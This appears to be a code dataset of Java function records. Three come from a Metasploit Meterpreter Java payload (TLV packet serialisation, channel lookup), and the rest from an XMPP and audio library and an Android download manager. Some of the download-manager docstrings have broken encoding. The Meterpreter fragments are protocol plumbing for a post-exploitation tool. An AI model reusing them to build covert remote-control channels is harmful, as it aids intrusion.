{"docstring": "/**\n * Write a single value to an output stream.\n */\n", "func_signal": "private static void write(DataOutputStream out, int type, Object value) throws IOException", "code": "{\n    byte[] data;\n    if ((type & TLV_META_TYPE_STRING) != 0) {\n        data = ((String) value + \"\\0\").getBytes(\"UTF-8\");\n    } else if ((type & TLV_META_TYPE_QWORD) != 0) {\n        out.writeInt(16);\n        out.writeInt(type);\n        out.writeLong(((Long) value).longValue());\n        return;\n    } else if ((type & TLV_META_TYPE_UINT) != 0) {\n        out.writeInt(12);\n        out.writeInt(type);\n        out.writeInt(((Integer) value).intValue());\n        return;\n    } else if ((type & TLV_META_TYPE_BOOL) != 0) {\n        out.writeInt(9);\n        out.writeInt(type);\n        out.writeBoolean(((Boolean) value).booleanValue());\n        return;\n    } else if ((type & TLV_META_TYPE_RAW) != 0) {\n        data = (byte[]) value;\n    } else if ((type & TLV_META_TYPE_GROUP) != 0) {\n        data = ((TLVPacket) value).toByteArray();\n    } else if ((type & TLV_META_TYPE_COMPLEX) != 0) {\n        data = (byte[]) value;\n    } else {\n        throw new IOException(\"Unsupported type: \" + type);\n    }\n    out.writeInt(8 + data.length);\n    out.writeInt(type);\n    out.write(data);\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Convert all the values to a byte array.\n */\n", "func_signal": "public byte[] toByteArray() throws IOException", "code": "{\n    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n    write(new DataOutputStream(baos));\n    return baos.toByteArray();\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Obtain a channel for a given channel ID\n *\n * @param id                 The channel ID to look up\n * @param throwIfNonexisting Whether to throw an exception if the channel does not exist\n * @return The channel, or <code>null</code> if the channel does not exist and it should not throw an exception\n */\n", "func_signal": "public Channel getChannel(int id, boolean throwIfNonexisting)", "code": "{\n    Channel result = null;\n    if (id < channels.size()) {\n        result = (Channel) channels.get(id);\n    }\n    if (result == null && throwIfNonexisting) {\n        throw new IllegalArgumentException(\"Channel \" + id + \" does not exist.\");\n    }\n    return result;\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Returns the index of the specified <tt>csrc</tt> level in the\n * <tt>levels</tt> matrix or <tt>-1</tt> if <tt>levels</tt> is <tt>null</tt>\n * or does not contain <tt>csrc</tt>.\n *\n * @param levels the bi-dimensional array that we'd like to search for\n * the specified <tt>csrc</tt>.\n * @param csrc the CSRC identifier that we are looking for.\n *\n * @return the the index of the specified <tt>csrc</tt> level in the\n * <tt>levels</tt> matrix or <tt>-1</tt> if <tt>levels</tt> is <tt>null</tt>\n * or does not contain <tt>csrc</tt>.\n */\n", "func_signal": "private int findCSRC(long[][] levels, long csrc)", "code": "{\n    if (levels != null)\n    {\n        for (int i = 0; i < levels.length; i++)\n        {\n            if (levels[i][0] == csrc)\n                return i;\n        }\n    }\n    return -1;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\audiolevel\\AudioLevelMap.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Methods to test the listener.\n */\n", "func_signal": "public void connectionClosed()", "code": "{\n    connectionClosed = true;\n    \n    if (countDownLatch != null)\n        countDownLatch.countDown();\n}", "path": "lib-src\\smack_src_3_3_0\\test\\org\\jivesoftware\\smack\\ReconnectionTest.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Overrides {@link Canvas#update(Graphics)} to skip the filling with the\n * background color in order to prevent flickering.\n */\n", "func_signal": "@Override\npublic void update(Graphics g)", "code": "{\n    synchronized (getHandleLock())\n    {\n        if (!wantsPaint || (getHandle() == 0))\n        {\n            super.update(g);\n            return;\n        }\n    }\n\n    /*\n     * Skip the filling with the background color because it causes\n     * flickering.\n     */\n    paint(g);\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\jmfext\\media\\renderer\\video\\JAWTRendererVideoComponent.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Overrides {@link Canvas#paint(Graphics)} to paint this <tt>Component</tt>\n * in the native counterpart of its associated <tt>JAWTRenderer</tt>.\n */\n", "func_signal": "@Override\npublic void paint(Graphics g)", "code": "{\n    /*\n     * XXX If the size of this Component is tiny enough to crash sws_scale,\n     * then it may cause issues with other functionality as well. Stay on\n     * the safe side.\n     */\n    if (wantsPaint\n            && (getWidth() >= SwScale.MIN_SWS_SCALE_HEIGHT_OR_WIDTH)\n            && (getHeight() >= SwScale.MIN_SWS_SCALE_HEIGHT_OR_WIDTH))\n    {\n        synchronized (getHandleLock())\n        {\n            long handle;\n\n            if ((handle = getHandle()) != 0)\n            {\n                Container parent = getParent();\n                int zOrder\n                    = (parent == null)\n                        ? -1\n                        : parent.getComponentZOrder(this);\n\n                wantsPaint = JAWTRenderer.paint(handle, this, g, zOrder);\n            }\n        }\n    }\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\jmfext\\media\\renderer\\video\\JAWTRendererVideoComponent.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Processes (encode) a specific input <tt>Buffer</tt>.\n *\n * @param inputBuffer input buffer\n * @param outputBuffer output buffer\n * @return <tt>BUFFER_PROCESSED_OK</tt> if buffer has been successfully\n * processed\n * @see AbstractCodecExt#doProcess(Buffer, Buffer)\n */\n", "func_signal": "protected int doProcess(Buffer inputBuffer, Buffer outputBuffer)", "code": "{\n    Format inputFormat = inputBuffer.getFormat();\n\n    if ((inputFormat != null)\n            && (inputFormat != this.inputFormat)\n            && !inputFormat.equals(this.inputFormat))\n    {\n        if (null == setInputFormat(inputFormat))\n            return BUFFER_PROCESSED_FAILED;\n    }\n    inputFormat = this.inputFormat;\n\n    /*\n     * Make sure that the native Speex encoder which is represented by this\n     * instance is configured to work with the inputFormat.\n     */\n    AudioFormat inputAudioFormat = (AudioFormat) inputFormat;\n    int inputSampleRate = (int) inputAudioFormat.getSampleRate();\n\n    if ((state != 0) && (sampleRate != inputSampleRate))\n    {\n        Speex.speex_encoder_destroy(state);\n        state = 0;\n        sampleRate = 0;\n        frameSize = 0;\n    }\n    if (state == 0)\n    {\n        long mode\n            = Speex.speex_lib_get_mode(\n                    (inputSampleRate == 16000)\n                        ? Speex.SPEEX_MODEID_WB\n                        : (inputSampleRate == 32000)\n                            ? Speex.SPEEX_MODEID_UWB\n                            : Speex.SPEEX_MODEID_NB);\n\n        if (mode == 0)\n            return BUFFER_PROCESSED_FAILED;\n        state = Speex.speex_encoder_init(mode);\n        if (state == 0)\n            return BUFFER_PROCESSED_FAILED;\n        if (Speex.speex_encoder_ctl(\n                    state,\n                    Speex.SPEEX_SET_QUALITY,\n                    4)\n                != 0)\n            return BUFFER_PROCESSED_FAILED;\n        if (Speex.speex_encoder_ctl(\n                    state,\n                    Speex.SPEEX_SET_SAMPLING_RATE,\n                    inputSampleRate)\n                != 0)\n            return BUFFER_PROCESSED_FAILED;\n\n        int frameSize\n            = Speex.speex_encoder_ctl(state, Speex.SPEEX_GET_FRAME_SIZE);\n\n        if (frameSize < 0)\n            return BUFFER_PROCESSED_FAILED;\n\n        sampleRate = inputSampleRate;\n        this.frameSize = frameSize * 2 /* (sampleSizeInBits / 8) */;\n        duration\n            = (((long) frameSize) * 1000 * 1000000) / ((long) sampleRate);\n    }\n\n    /*\n     * The native Speex encoder always processes frameSize bytes from the\n     * input in one call. If any specified inputBuffer is with a different\n     * length, then we'll have to wait for more bytes to arrive until we\n     * have frameSize bytes. Remember whatever is left unprocessed in\n     * previousInput and prepend it to the next inputBuffer.\n     */\n    byte[] input = (byte[]) inputBuffer.getData();\n    int inputLength = inputBuffer.getLength();\n    int inputOffset = inputBuffer.getOffset();\n\n    if ((previousInput != null) && (previousInputLength > 0))\n    {\n        if (previousInputLength < this.frameSize)\n        {\n            if (previousInput.length < this.frameSize)\n            {\n                byte[] newPreviousInput = new byte[this.frameSize];\n\n                System.arraycopy(\n                        previousInput, 0,\n                        newPreviousInput, 0,\n                        previousInput.length);\n                previousInput = newPreviousInput;\n            }\n\n            int bytesToCopyFromInputToPreviousInput\n                = Math.min(\n                        this.frameSize - previousInputLength,\n                        inputLength);\n\n            if (bytesToCopyFromInputToPreviousInput > 0)\n            {\n                System.arraycopy(\n                        input, inputOffset,\n                        previousInput, previousInputLength,\n                        bytesToCopyFromInputToPreviousInput);\n                previousInputLength += bytesToCopyFromInputToPreviousInput;\n                inputLength -= bytesToCopyFromInputToPreviousInput;\n                inputBuffer.setLength(inputLength);\n                inputBuffer.setOffset(\n                        inputOffset + bytesToCopyFromInputToPreviousInput);\n            }\n        }\n\n        if (previousInputLength == this.frameSize)\n        {\n            input = previousInput;\n            inputOffset = 0;\n            previousInputLength = 0;\n        }\n        else if (previousInputLength > this.frameSize)\n        {\n            input = new byte[this.frameSize];\n            System.arraycopy(previousInput, 0, input, 0, input.length);\n            inputOffset = 0;\n            previousInputLength -= input.length;\n            System.arraycopy(\n                    previousInput, input.length,\n                    previousInput, 0,\n                    previousInputLength);\n        }\n        else\n        {\n            outputBuffer.setLength(0);\n            discardOutputBuffer(outputBuffer);\n            if (inputLength < 1)\n                return BUFFER_PROCESSED_OK;\n            else\n                return BUFFER_PROCESSED_OK | INPUT_BUFFER_NOT_CONSUMED;\n        }\n    }\n    else if (inputLength < 1)\n    {\n        outputBuffer.setLength(0);\n        discardOutputBuffer(outputBuffer);\n        return BUFFER_PROCESSED_OK;\n    }\n    else if (inputLength < this.frameSize)\n    {\n        if ((previousInput == null) || (previousInput.length < inputLength))\n            previousInput = new byte[this.frameSize];\n        System.arraycopy(input, inputOffset, previousInput, 0, inputLength);\n        previousInputLength = inputLength;\n        outputBuffer.setLength(0);\n        discardOutputBuffer(outputBuffer);\n        return BUFFER_PROCESSED_OK;\n    }\n    else\n    {\n        inputLength -= this.frameSize;\n        inputBuffer.setLength(inputLength);\n        inputBuffer.setOffset(inputOffset + this.frameSize);\n    }\n\n    /* At long last, do the actual encoding. */\n    Speex.speex_bits_reset(bits);\n    Speex.speex_encode_int(state, input, inputOffset, bits);\n\n    /* Read the encoded audio data from the SpeexBits into outputBuffer. */\n    int outputLength = Speex.speex_bits_nbytes(bits);\n\n    if (outputLength > 0)\n    {\n        byte[] output\n            = validateByteArraySize(outputBuffer, outputLength, false);\n\n        outputLength\n            = Speex.speex_bits_write(bits, output, 0, output.length);\n        if (outputLength > 0)\n        {\n            outputBuffer.setDuration(duration);\n            outputBuffer.setFormat(getOutputFormat());\n            outputBuffer.setLength(outputLength);\n            outputBuffer.setOffset(0);\n        }\n        else\n        {\n            outputBuffer.setLength(0);\n            discardOutputBuffer(outputBuffer);\n        }\n    }\n    else\n    {\n        outputBuffer.setLength(0);\n        discardOutputBuffer(outputBuffer);\n    }\n\n    if (inputLength < 1)\n        return BUFFER_PROCESSED_OK;\n    else\n        return BUFFER_PROCESSED_OK | INPUT_BUFFER_NOT_CONSUMED;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Creates a new bi-dimensional array containing all entries (if any) from\n * the <tt>levels</tt> matrix and an extra entry for the specified\n * <tt>csrc</tt> and <tt>level</tt>.\n *\n * @param levels the bi-dimensional levels array that we'd like to add a\n * mapping to.\n * @param csrc the CSRC identifier that we'd like to add to the\n * <tt>levels</tt> bi-dimensional array.\n * @param level the level corresponding to the <tt>csrc</tt> identifier.\n *\n * @return a new matrix containing all entries from levels and a new one\n * mapping <tt>csrc</tt> to <tt>level</tt>\n */\n", "func_signal": "private long[][] appendCSRCToMatrix(long[][] levels, long csrc, int level)", "code": "{\n    int newLength = 1 + ((levels == null) ? 0 : levels.length);\n    long[][] newLevels = new long[newLength][];\n\n    //put the new level.\n    newLevels[0] = new long[] { csrc, level };\n\n    if (newLength == 1)\n        return newLevels;\n\n    System.arraycopy(levels, 0, newLevels, 1, levels.length);\n\n    return newLevels;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\audiolevel\\AudioLevelMap.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Get the output format.\n *\n * @return output format\n * @see net.sf.fmj.media.AbstractCodec#getOutputFormat()\n */\n", "func_signal": "@Override\npublic Format getOutputFormat()", "code": "{\n    Format outputFormat = super.getOutputFormat();\n\n    if ((outputFormat != null)\n            && (outputFormat.getClass() == AudioFormat.class))\n    {\n        AudioFormat outputAudioFormat = (AudioFormat) outputFormat;\n\n        outputFormat = setOutputFormat(\n            new AudioFormat(\n                        outputAudioFormat.getEncoding(),\n                        outputAudioFormat.getSampleRate(),\n                        outputAudioFormat.getSampleSizeInBits(),\n                        outputAudioFormat.getChannels(),\n                        outputAudioFormat.getEndian(),\n                        outputAudioFormat.getSigned(),\n                        outputAudioFormat.getFrameSizeInBits(),\n                        outputAudioFormat.getFrameRate(),\n                        outputAudioFormat.getDataType())\n                    {\n                        private static final long serialVersionUID = 0L;\n\n                        @Override\n                        public long computeDuration(long length)\n                        {\n                            return JNIEncoder.this.duration;\n                        }\n                    });\n    }\n    return outputFormat;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Tests a manual reconnection.\n * Simulates a connection error, disables the reconnection mechanism and then reconnects.\n */\n", "func_signal": "public void testManualReconnectionWithCancelation() throws Exception", "code": "{\n    XMPPConnection connection = getConnection(0);\n    CountDownLatch latch = new CountDownLatch(1);\n    XMPPConnectionTestListener listener = new XMPPConnectionTestListener(latch);\n    connection.addConnectionListener(listener);\n\n    // Produces a connection error\n    connection.notifyConnectionError(new Exception(\"Simulated Error\"));\n    assertEquals(\n            \"An error occurs but the ConnectionListener.connectionClosedOnError(e) was not notified\",\n            true, listener.connectionClosedOnError);\n//        Thread.sleep(1000);\n    \n    // Cancels the automatic reconnection\n    connection.getConfiguration().setReconnectionAllowed(false);\n    // Waits for a reconnection that must not happened.\n    Thread.sleep(MIN_RECONNECT_WAIT * 1000);\n    // Cancels the automatic reconnection\n    assertEquals(false, listener.reconnected);\n\n    // Makes a manual reconnection from an error terminated connection without reconnection\n    connection.connect();\n\n    // Executes some server interaction testing the connection\n    executeSomeServerInteraction(connection);\n}", "path": "lib-src\\smack_src_3_3_0\\test\\org\\jivesoftware\\smack\\ReconnectionTest.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * If this map already contains <tt>csrc</tt> this method updates its level,\n * otherwise we add a new entry mapping <tt>csrc</tt> to <tt>level</tt>.\n *\n * @param csrc the CSRC key that we'd like to add/update.\n * @param level the new audio level for the specified <tt>csrc</tt>.\n */\n", "func_signal": "public void putLevel(long csrc, int level)", "code": "{\n    //copy the levels matrix so that no one pulls it from under our feet.\n    long[][] levelsRef = levels;\n    int csrcIndex = findCSRC(levelsRef, csrc);\n\n    if (csrcIndex == -1)\n    {\n        //we don't have the csrc in there yet so we need a new row.\n        levels = appendCSRCToMatrix(levelsRef, csrc, level);\n    }\n    else\n    {\n        levelsRef[csrcIndex][1] = level;\n    }\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\audiolevel\\AudioLevelMap.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Sets the input format.\n *\n * @param format format to set\n * @return format\n * @see AbstractCodecExt#setInputFormat(Format)\n */\n", "func_signal": "@Override\npublic Format setInputFormat(Format format)", "code": "{\n    Format inputFormat = super.setInputFormat(format);\n\n    if (inputFormat != null)\n    {\n        double outputSampleRate;\n        int outputChannels;\n\n        if (outputFormat == null)\n        {\n            outputSampleRate = Format.NOT_SPECIFIED;\n            outputChannels = Format.NOT_SPECIFIED;\n        }\n        else\n        {\n            AudioFormat outputAudioFormat = (AudioFormat) outputFormat;\n\n            outputSampleRate = outputAudioFormat.getSampleRate();\n            outputChannels = outputAudioFormat.getChannels();\n        }\n\n        AudioFormat inputAudioFormat = (AudioFormat) inputFormat;\n        double inputSampleRate = inputAudioFormat.getSampleRate();\n        int inputChannels = inputAudioFormat.getChannels();\n\n        if ((outputSampleRate != inputSampleRate)\n                || (outputChannels != inputChannels))\n        {\n            setOutputFormat(\n                new AudioFormat(\n                        Constants.SPEEX_RTP,\n                        inputSampleRate,\n                        Format.NOT_SPECIFIED,\n                        inputChannels,\n                        AudioFormat.LITTLE_ENDIAN,\n                        AudioFormat.SIGNED,\n                        Format.NOT_SPECIFIED,\n                        Format.NOT_SPECIFIED,\n                        Format.byteArray));\n        }\n    }\n    return inputFormat;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Tests a manual reconnection after a login.\n * Closes the connection and then reconnects.\n */\n", "func_signal": "public void testCloseAndManualReconnection() throws Exception", "code": "{\n    XMPPConnection connection = getConnection(0);\n    String username = connection.getConfiguration().getUsername();\n    String password = connection.getConfiguration().getPassword();\n    XMPPConnectionTestListener listener = new XMPPConnectionTestListener();\n    connection.addConnectionListener(listener);\n\n    // Produces a normal disconnection\n    connection.disconnect();\n    assertEquals(\"ConnectionListener.connectionClosed() was not notified\",\n            true, listener.connectionClosed);\n    // Waits 10 seconds waiting for a reconnection that must not happened.\n    Thread.sleep(MIN_RECONNECT_WAIT * 1000);\n    assertEquals(\"The connection was stablished but it was not allowed to\", false,\n            listener.reconnected);\n\n    // Makes a manual reconnection\n    connection.connect();\n    connection.login(username, password);\n\n    // Executes some server interaction testing the connection\n    executeSomeServerInteraction(connection);\n}", "path": "lib-src\\smack_src_3_3_0\\test\\org\\jivesoftware\\smack\\ReconnectionTest.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Opens this <tt>Codec</tt> and acquires the resources that it needs to\n * operate. A call to {@link PlugIn#open()} on this instance will result in\n * a call to <tt>doOpen</tt> only if {@link AbstractCodec#opened} is\n * <tt>false</tt>. All required input and/or output formats are assumed to\n * have been set on this <tt>Codec</tt> before <tt>doOpen</tt> is called.\n *\n * @throws ResourceUnavailableException if any of the resources that this\n * <tt>Codec</tt> needs to operate cannot be acquired\n * @see AbstractCodecExt#doOpen()\n */\n", "func_signal": "protected void doOpen()\n    throws ResourceUnavailableException", "code": "{\n    bits = Speex.speex_bits_init();\n    if (bits == 0)\n        throw new ResourceUnavailableException(\"speex_bits_init\");\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Removes <tt>csrc</tt> and its mapped level from this map.\n *\n * @param csrc the CSRC ID that we'd like to remove from this map.\n *\n * @return <tt>true</tt> if <tt>csrc</tt> was present in the <tt>Map</tt>\n * and <tt>false</tt> otherwise.\n */\n", "func_signal": "public boolean removeLevel(long csrc)", "code": "{\n    //copy the levels matrix so that no one pulls it from under our feet.\n    long[][] levelsRef = levels;\n    int index = findCSRC(levelsRef, csrc);\n\n    if (index == -1)\n        return false;\n\n    if (levelsRef.length == 1)\n    {\n        levels = null;\n        return true;\n    }\n\n    //copy levelsRef into newLevels ref making sure we skip the entry\n    //containing the CSRC ID that we are trying to remove;\n    long[][] newLevelsRef = new long[levelsRef.length - 1][];\n\n    System.arraycopy(levelsRef, 0, newLevelsRef, 0, index);\n    System.arraycopy(\n            levelsRef, index + 1,\n            newLevelsRef, index, newLevelsRef.length - index);\n\n    levels = newLevelsRef;\n    return true;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\audiolevel\\AudioLevelMap.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Returns the audio level of the specified <tt>csrc</tt> id or <tt>-1</tt>\n * if <tt>csrc</tt> is not currently registered in this map.\n *\n * @param csrc the CSRC ID whose level we'd like to obtain.\n *\n * @return the audio level of the specified <tt>csrc</tt> id or <tt>-1</tt>\n * if <tt>csrc</tt> is not currently registered in this map.\n */\n", "func_signal": "public int getLevel(long csrc)", "code": "{\n    long[][] levelsRef = levels;\n    int index = findCSRC(levelsRef, csrc);\n\n    return (index == -1) ? -1 : ((int) levelsRef[index][1]);\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\audiolevel\\AudioLevelMap.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Tests a reconnection in a anonymously logged connection.\n * Closes the connection and then reconnects.\n */\n", "func_signal": "public void testAnonymousReconnection() throws Exception", "code": "{\n    XMPPConnection connection = createConnection();\n    connection.connect();\n    XMPPConnectionTestListener listener = new XMPPConnectionTestListener();\n    connection.addConnectionListener(listener);\n\n    // Makes the anounymous login\n    connection.loginAnonymously();\n\n    // Produces a normal disconnection\n    connection.disconnect();\n    assertEquals(\"ConnectionListener.connectionClosed() was not notified\",\n            true, listener.connectionClosed);\n    // Makes a manual reconnection\n    connection.connect();\n    connection.loginAnonymously();\n    assertEquals(\"Failed the manual connection\", true, connection.isAnonymous());\n}", "path": "lib-src\\smack_src_3_3_0\\test\\org\\jivesoftware\\smack\\ReconnectionTest.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Tests an automatic reconnection.\n * Simulates a connection error and then waits until gets reconnected.\n */\n", "func_signal": "public void testAutomaticReconnection() throws Exception", "code": "{\n    XMPPConnection connection = getConnection(0);\n    CountDownLatch latch = new CountDownLatch(1);\n    XMPPConnectionTestListener listener = new XMPPConnectionTestListener(latch);\n    connection.addConnectionListener(listener);\n\n    // Simulates an error in the connection\n    connection.notifyConnectionError(new Exception(\"Simulated Error\"));\n    latch.await(MIN_RECONNECT_WAIT, TimeUnit.SECONDS);\n    \n    // After 10 seconds, the reconnection manager must reestablishes the connection\n    assertEquals(\"The ConnectionListener.connectionStablished() notification was not fired\", true, listener.reconnected);\n    assertTrue(\"The ReconnectionManager algorithm has reconnected without waiting at least 5 seconds\", listener.attemptsNotifications > 0);\n\n    // Executes some server interaction testing the connection\n    executeSomeServerInteraction(connection);\n}", "path": "lib-src\\smack_src_3_3_0\\test\\org\\jivesoftware\\smack\\ReconnectionTest.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Get the output formats matching a specific input format.\n *\n * @param inputFormat the input format to get the matching output formats of\n * @return the output formats matching the specified input format\n * @see AbstractCodecExt#getMatchingOutputFormats(Format)\n */\n", "func_signal": "@Override\nprotected Format[] getMatchingOutputFormats(Format inputFormat)", "code": "{\n    AudioFormat inputAudioFormat = (AudioFormat) inputFormat;\n\n    return\n        new Format[]\n                {\n                    new AudioFormat(\n                            Constants.SPEEX_RTP,\n                            inputAudioFormat.getSampleRate(),\n                            Format.NOT_SPECIFIED,\n                            1,\n                            AudioFormat.LITTLE_ENDIAN,\n                            AudioFormat.SIGNED,\n                            Format.NOT_SPECIFIED,\n                            Format.NOT_SPECIFIED,\n                            Format.byteArray)\n                };\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Overrides {@link Component#removeNotify()} to reset the indicator which\n * determines whether the native counterpart of this <tt>JAWTRenderer</tt>\n * wants <tt>paint</tt> calls on its AWT <tt>Component</tt> to be delivered.\n */\n", "func_signal": "@Override\npublic void removeNotify()", "code": "{\n    /*\n     * In case the associated JAWTRenderer has said that it does not\n     * want paint events/notifications, ask it again next time because\n     * the native handle of this Canvas may be recreated.\n     */\n    wantsPaint = true;\n\n    super.removeNotify();\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\jmfext\\media\\renderer\\video\\JAWTRendererVideoComponent.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * @see AbstractCodecExt#doClose()\n */\n", "func_signal": "protected void doClose()", "code": "{\n    // state\n    if (state != 0)\n    {\n        Speex.speex_encoder_destroy(state);\n        state = 0;\n        sampleRate = 0;\n        frameSize = 0;\n        duration = 0;\n    }\n    // bits\n    Speex.speex_bits_destroy(bits);\n    bits = 0;\n    // previousInput\n    previousInput = null;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * Initializes a new <tt>JNIEncoder</tt> instance.\n */\n", "func_signal": "public JNIEncoder()", "code": "{\n    super(\n        \"Speex JNI Encoder\",\n        AudioFormat.class,\n        SUPPORTED_OUTPUT_FORMATS);\n\n    inputFormats = SUPPORTED_INPUT_FORMATS;\n}", "path": "lib-src\\libjitsi\\src\\org\\jitsi\\impl\\neomedia\\codec\\audio\\speex\\JNIEncoder.java", "repo_name": "bejayoharen/java-bells", "stars": 77, "license": "other", "language": "java", "size": 30209}
{"docstring": "/**\n * \u05f4\u032c\u037c\n * @param downloadPercentView\n * @param status\n */\n", "func_signal": "private void setIconByStatus(DownloadPercentView downloadPercentView, AppContent.Status status)", "code": "{\n    downloadPercentView.setVisibility(View.VISIBLE);\n    if(status == AppContent.Status.PENDING) {\n        downloadPercentView.setStatus(DownloadPercentView.STATUS_PEDDING);\n    }\n    if(status == AppContent.Status.DOWNLOADING) {\n        downloadPercentView.setStatus(DownloadPercentView.STATUS_DOWNLOADING);\n    }\n    if(status == AppContent.Status.WAITING) {\n        downloadPercentView.setStatus(DownloadPercentView.STATUS_WAITING);\n    }\n    if(status == AppContent.Status.PAUSED) {\n        downloadPercentView.setStatus(DownloadPercentView.STATUS_PAUSED);\n    }\n    if(status == AppContent.Status.FINISHED) {\n        downloadPercentView.setStatus(DownloadPercentView.STATUS_FINISHED);\n    }\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\adapters\\AppContentAdapter.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \u0221\u013c\u6d22\u013f\u00bc\n * @return\n */\n", "func_signal": "public static String getDownloadPath()", "code": "{\n    String downloadPath = null;\n    if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {\n        downloadPath = Environment.getExternalStorageDirectory() +\n                File.separator + \"download\";\n    }\n    return downloadPath;\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\utils\\DownloadUtils.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
{"docstring": "/**\n * \n * @param downloadInfo\n */\n", "func_signal": "public void insertDownloadInfo(DownloadInfo downloadInfo)", "code": "{\n    if(downloadInfo == null) {\n        return;\n    }\n    //\u047e\u06a3\u05b1\u07b8\n    if(getDownloadInfoByTaskIdAndUrl(downloadInfo.getTaskId(), downloadInfo.getUrl()) != null) {\n        updateDownloadInfo(downloadInfo);\n        return;\n    }\n    SQLiteDatabase database = getConnection();\n    try {\n        String sql = \"insert into download_info(task_id, download_length, url, is_success) values (?,?,?,?)\";\n        Object[] bindArgs = { downloadInfo.getTaskId(), downloadInfo.getDownloadLength(),\n                downloadInfo.getUrl(), downloadInfo.isDownloadSuccess()};\n        database.execSQL(sql, bindArgs);\n    } catch (Exception e) {\n        Log.e(TAG, e.getMessage());\n    } finally {\n        if (null != database) {\n            database.close();\n        }\n    }\n}", "path": "multitaskdownload\\src\\main\\java\\com\\bbk\\lling\\multitaskdownload\\db\\DownloadInfoDAO.java", "repo_name": "liuling07/MultiTaskAndThreadDownload", "stars": 118, "license": "None", "language": "java", "size": 898}
